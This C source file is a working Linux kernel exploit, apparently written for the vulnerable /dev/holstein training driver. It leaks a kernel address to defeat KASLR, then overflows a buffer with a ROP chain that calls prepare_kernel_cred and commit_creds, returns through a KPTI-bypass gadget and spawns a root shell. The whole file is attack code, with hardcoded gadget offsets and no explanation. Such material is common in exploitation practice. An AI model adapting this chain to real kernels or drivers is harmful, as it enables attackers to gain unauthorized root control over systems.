#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

unsigned long kernel_base;
unsigned long user_cs, user_ss, user_rsp, user_rflags;
#define prepare_kernel_cred (kbase + 0x6e240)
#define commit_creds        (kbase + 0x6e390)
#define rop_pop_rdi               (kbase + 0x27bbdc)
#define rop_pop_rcx               (kbase + 0x32cdd3)
#define rop_mov_rdi_rax_rep_movsq (kbase + 0x60c96b)
#define rop_bypass_kpti           (kbase + 0x800e26)

void fatal(const char *msg) {
    perror(msg);
    exit(1);
}

static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

static void win() {
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {"NULL"};
    puts("[+] win!");
    execve("/bin/sh", argv, envp);
}

int main() {
    save_state();
    int fd = open("/dev/holstein", O_RDWR);
    if (fd == -1) fatal("open(\"/dev/holstein\")");

    char buf[0x800] = {};
    read(fd, buf, 0x410);
    unsigned long kbase = *(unsigned long*) &buf[0x408] - (0xffffffff8113d33c-0xffffffff81000000);
    printf("Kernel base: %p\n", (void *) kbase);

    memset(buf, 'A', 0x408);
    unsigned long* chain = (unsigned long*) &buf[0x408];
    *chain++ = rop_pop_rdi;
    *chain++ = 0;
    *chain++ = prepare_kernel_cred;
    *chain++ = rop_pop_rcx; // set rcx = 0 because it's the counter for rep movsq loop 
    *chain++ = 0;
    *chain++ = rop_mov_rdi_rax_rep_movsq;
    *chain++ = commit_creds;
    *chain++ = rop_bypass_kpti;
    *chain++ = 0xdeadbeefcafebabe;
    *chain++ = 0xdeadbeefcafebabe;
    *chain++ = (unsigned long) win;
    *chain++ = user_cs;
    *chain++ = user_rflags;
    *chain++ = user_rsp;
    *chain++ = user_ss;

    write(fd, buf, (void*) chain - (void*) buf);
    close(fd);

    return 0;
}